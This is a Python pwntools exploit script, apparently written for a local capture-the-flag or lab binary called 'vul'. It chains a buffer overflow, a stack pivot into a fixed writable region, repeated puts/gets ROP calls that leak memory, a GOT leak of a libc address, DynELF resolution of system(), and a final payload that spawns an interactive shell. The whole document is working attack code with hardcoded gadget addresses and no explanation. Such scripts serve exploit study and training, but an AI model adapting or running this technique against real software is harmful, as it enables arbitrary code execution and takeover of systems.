#!/usr/bin/env python

from pwn import *


# Start your service by 'ncat -vc ./vul -kl 127.0.0.1 8888'
r = remote('127.0.0.1', 10002)


gets = 0x80483f0
puts = 0x08048420
main = 0x804858d
puts_got = 0x804a018
leave_ret = 0x804860f
pop_ebx_ret = 0x080483d1

buf1 = 0x0804b000-0x40
buf2 = 0x0804b000-0x140

# Stack migration
r.send('A'*112 + p32(buf1) + p32(gets) + p32(leave_ret) + p32(buf1) + '\n')

# Leaker function. Also keep migrating stack between buf1, buf2
def leak(addr):
#  print "addr = ", hex(addr)
  global buf1, buf2, delay
  buf1, buf2 = buf2, buf1
  r.send(p32(buf1) +
      p32(puts) + p32(pop_ebx_ret) + p32(addr) +
      p32(gets) + p32(leave_ret) + p32(buf1) +
      '\n')
#  raw_input('@')
  #s = r.recv[:-1]+'\x00'
  s = r.recvrepeat(0.1)[:-1]+'\x00' # replace '\n' with '\0'
#  print repr(s)
  return s

raw_input('#')

# Leak a pointer/address in libc
ptr_libc = u32(leak(puts_got)[:4])
print 'Address in libc:', hex(ptr_libc)

# DynELF@pwntools symbol resolving
d = DynELF(leak, ptr_libc)
system = d.lookup('system')

# Spawn shell. This payload is going to be written to buf1
r.send(p32(0) + 
    p32(system) + p32(0) + p32(buf1 + 0x10) +
    'sh\x00' +
    '\n')

r.interactive()

